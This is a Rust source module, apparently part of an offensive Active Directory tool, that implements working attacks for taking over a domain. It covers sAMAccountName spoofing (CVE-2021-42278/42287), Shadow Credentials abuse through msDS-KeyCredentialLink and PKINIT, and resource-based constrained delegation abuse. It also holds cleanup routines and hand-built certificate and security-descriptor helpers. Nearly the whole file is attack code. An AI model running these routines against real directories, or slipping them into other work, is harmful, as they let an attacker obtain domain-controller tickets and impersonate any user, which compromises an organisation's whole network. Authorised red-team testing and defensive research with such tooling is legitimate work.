use crate::error::{OverthroneError, Result};
use crate::proto::ldap::LdapSession;
use crate::proto::pkinit::{CertificateGenerator, PkinitAuthenticator, PkinitConfig};
use chrono::Utc;
use kerberos_asn1::Asn1Object;
use tracing::info;
use x509_parser::prelude::*;

// ─────────────────────────────────────────────────────────────
// CVE-2021-42278 + CVE-2021-42287 — sAMAccountName Spoofing
// ─────────────────────────────────────────────────────────────

pub struct SamAccountNameSpoofResult {
    pub tgt_ticket: Vec<u8>,
    pub session_key: Vec<u8>,
    pub target_dc: String,
    pub computer_dn: String,
    pub computer_password: String,
}

pub async fn exploit_samname_spoof(
    ldap: &mut LdapSession,
    dc_ip: &str,
    domain: &str,
    dc_sam_name: &str,
    password: &str,
) -> Result<SamAccountNameSpoofResult> {
    let spoofed_name = dc_sam_name.trim_end_matches('$');
    let computer_name = format!("{}$", spoofed_name);
    let container_dn = format!("CN=Computers,{}", ldap.base_dn);

    info!("CVE-2021-42278: Creating computer with sAMAccountName={spoofed_name}");
    let computer_dn = ldap
        .add_computer(&computer_name, password, Some(&container_dn))
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "CVE-2021-42278: Failed to create spoofed computer: {e}"
            ))
        })?;

    info!("CVE-2021-42278: Requesting TGT — KDC should confuse names and issue DC ticket");
    let tgt = crate::proto::kerberos::request_tgt(dc_ip, domain, spoofed_name, password, false)
        .await
        .map_err(|e| OverthroneError::Custom(format!("CVE-2021-42278: TGT request failed: {e}")))?;

    info!("CVE-2021-42278/42287: TGT obtained for {spoofed_name} via KDC confusion");

    Ok(SamAccountNameSpoofResult {
        tgt_ticket: tgt.ticket.build(),
        session_key: tgt.session_key,
        target_dc: dc_ip.to_string(),
        computer_dn,
        computer_password: password.to_string(),
    })
}

// ─────────────────────────────────────────────────────────────
// Shadow Credentials — msDS-KeyCredentialLink → PKINIT TGT
// ─────────────────────────────────────────────────────────────

pub struct ShadowCredentialsResult {
    pub target_dn: String,
    pub certificate: Vec<u8>,
    pub private_key: Vec<u8>,
    pub tgt: Vec<u8>,
    pub session_key: Vec<u8>,
}

pub async fn exploit_shadow_credentials(
    ldap: &mut LdapSession,
    dc_ip: &str,
    domain: &str,
    target_dn: &str,
) -> Result<ShadowCredentialsResult> {
    let (cert_der, private_key_der) = CertificateGenerator::generate_certificate(target_dn, 2048)?;

    let key_cred_blob = build_key_credential_link_v2(&cert_der)?;

    info!(
        "Shadow Credentials: Writing msDS-KeyCredentialLink to {target_dn} ({} bytes)",
        key_cred_blob.len()
    );
    ldap.modify_add_binary(target_dn, "msDS-KeyCredentialLink", key_cred_blob)
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "Shadow Credentials: Failed to write KeyCredentialLink: {e}"
            ))
        })?;

    info!("Shadow Credentials: Authenticating via PKINIT as {target_dn}");
    let pkinit_cfg = PkinitConfig {
        certificate: cert_der.clone(),
        private_key: private_key_der.clone(),
        realm: domain.to_uppercase(),
        username: target_dn.to_string(),
        kdc_host: dc_ip.to_string(),
        check_revocation: false,
        revocation_timeout_secs: 5,
    };
    let authenticator = PkinitAuthenticator::new(pkinit_cfg);
    let pkinit_result = authenticator.authenticate().await.map_err(|e| {
        OverthroneError::Custom(format!(
            "Shadow Credentials: PKINIT authentication failed: {e}"
        ))
    })?;

    info!("Shadow Credentials: TGT obtained for {target_dn}");

    Ok(ShadowCredentialsResult {
        target_dn: target_dn.to_string(),
        certificate: cert_der,
        private_key: private_key_der,
        tgt: pkinit_result.tgt,
        session_key: pkinit_result.session_key,
    })
}

// ─────────────────────────────────────────────────────────────
// RBCD — Resource-Based Constrained Delegation
// ─────────────────────────────────────────────────────────────

pub struct RbcdResult {
    pub target_dn: String,
    pub attacker_sid: String,
    pub attacker_computer: String,
}

pub async fn exploit_rbcd(
    ldap: &mut LdapSession,
    _dc_ip: &str,
    _domain: &str,
    target_dn: &str,
    attacker_computer_sam: &str,
    _password: &str,
) -> Result<RbcdResult> {
    let sid_bytes = ldap
        .resolve_object_sid_binary(attacker_computer_sam)
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "RBCD: Failed to resolve attacker SID for {attacker_computer_sam}: {e}"
            ))
        })?;

    let sid_str = sid_bytes_to_string(&sid_bytes);
    info!("RBCD: Attacker SID = {sid_str}, writing to {target_dn}");

    let sd = build_trustee_security_descriptor(&sid_bytes)?;

    ldap.modify_replace(target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd)
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "RBCD: Failed to write msDS-AllowedToActOnBehalfOfOtherIdentity: {e}"
            ))
        })?;

    info!(
        "RBCD: Delegation set — {attacker_computer_sam} can now impersonate any user to {target_dn}"
    );

    Ok(RbcdResult {
        target_dn: target_dn.to_string(),
        attacker_sid: sid_str,
        attacker_computer: attacker_computer_sam.to_string(),
    })
}

// ─────────────────────────────────────────────────────────────
// Cleanup Functions
// ─────────────────────────────────────────────────────────────

pub async fn cleanup_rbcd(ldap: &mut LdapSession, target_dn: &str) -> Result<()> {
    ldap.modify_delete(target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
        .await
        .map_err(|e| OverthroneError::Custom(format!("RBCD cleanup failed on {target_dn}: {e}")))?;
    info!("RBCD: Cleaned up msDS-AllowedToActOnBehalfOfOtherIdentity on {target_dn}");
    Ok(())
}

pub async fn cleanup_samname_spoof(ldap: &mut LdapSession, computer_dn: &str) -> Result<()> {
    ldap.delete_entry(computer_dn)
        .await
        .map_err(|e| OverthroneError::Custom(format!("Cleanup spoofed computer failed: {e}")))?;
    info!("CVE-2021-42278: Cleaned up spoofed computer {computer_dn}");
    Ok(())
}

pub async fn cleanup_shadow_credentials(ldap: &mut LdapSession, target_dn: &str) -> Result<()> {
    ldap.modify_delete(target_dn, "msDS-KeyCredentialLink")
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "Shadow Credentials cleanup failed on {target_dn}: {e}"
            ))
        })?;
    info!("Shadow Credentials: Cleaned up msDS-KeyCredentialLink on {target_dn}");
    Ok(())
}

// ─────────────────────────────────────────────────────────────
// Internal Helpers
// ─────────────────────────────────────────────────────────────

fn build_key_credential_link_v2(cert_der: &[u8]) -> Result<Vec<u8>> {
    let (_, cert) = X509Certificate::from_der(cert_der)
        .map_err(|e| OverthroneError::Encryption(format!("Cert parse: {e}")))?;

    let pubkey_bytes = cert.public_key().subject_public_key.data.as_ref().to_vec();
    let identifier = uuid::Uuid::new_v4();
    let identifier_bytes = identifier.as_bytes().to_vec();

    let time_der = {
        let dt = Utc::now();
        let time_str = format!("{}Z", dt.format("%Y%m%d%H%M%S"));
        let time_raw = time_str.into_bytes();
        let mut der = vec![0x18, time_raw.len() as u8];
        der.extend_from_slice(&time_raw);
        der
    };

    let key_data = yasna::construct_der(|w| {
        w.write_sequence(|w| {
            w.next().write_i64(1);
            w.next().write_bytes(&pubkey_bytes);
        });
    });

    Ok(yasna::construct_der(|w| {
        w.write_sequence(|w| {
            w.next().write_i64(2);
            w.next().write_bytes(&identifier_bytes);
            w.next().write_der(&time_der);
            w.next().write_sequence(|w| {
                w.next().write_i64(1);
                w.next().write_bytes(&key_data);
            });
        });
    }))
}

fn build_trustee_security_descriptor(attacker_sid: &[u8]) -> Result<Vec<u8>> {
    let sub_authority_count = (attacker_sid.len() - 8) / 4;
    if sub_authority_count > 15 || attacker_sid.len() < 8 {
        return Err(OverthroneError::Custom("Invalid SID length".into()));
    }

    let sd_control = 0x0014u16;
    let dacl_offset = 20u32;

    let mut sd = Vec::new();
    sd.extend_from_slice(&[0x01, 0x00]);
    sd.extend_from_slice(&sd_control.to_le_bytes());
    sd.extend_from_slice(&0u32.to_le_bytes());
    sd.extend_from_slice(&0u32.to_le_bytes());
    sd.extend_from_slice(&0u32.to_le_bytes());
    sd.extend_from_slice(&dacl_offset.to_le_bytes());

    let ace_type: u8 = 0x00;
    let ace_flags: u8 = 0x00;
    let ace_size: u16 = (4 + 4 + attacker_sid.len()) as u16;
    let access_mask: u32 = 0x0000000f;

    sd.push(0x01);
    sd.push(0x00);
    sd.extend_from_slice(&1u16.to_le_bytes());
    sd.extend_from_slice(&0u16.to_le_bytes());
    sd.push(ace_type);
    sd.push(ace_flags);
    sd.extend_from_slice(&ace_size.to_le_bytes());
    sd.extend_from_slice(&access_mask.to_le_bytes());
    sd.extend_from_slice(attacker_sid);

    Ok(sd)
}

fn sid_bytes_to_string(sid_bytes: &[u8]) -> String {
    if sid_bytes.len() < 8 {
        return "S-0-0".to_string();
    }
    let revision = sid_bytes[0];
    let authority = u64::from_be_bytes([
        0,
        0,
        sid_bytes[2],
        sid_bytes[3],
        sid_bytes[4],
        sid_bytes[5],
        sid_bytes[6],
        sid_bytes[7],
    ]);
    let mut parts: Vec<String> = vec![format!("S-{revision}-{authority}")];
    for i in (8..sid_bytes.len()).step_by(4) {
        if i + 4 <= sid_bytes.len() {
            let sub = u32::from_le_bytes([
                sid_bytes[i],
                sid_bytes[i + 1],
                sid_bytes[i + 2],
                sid_bytes[i + 3],
            ]);
            parts.push(sub.to_string());
        }
    }
    parts.join("-")
}
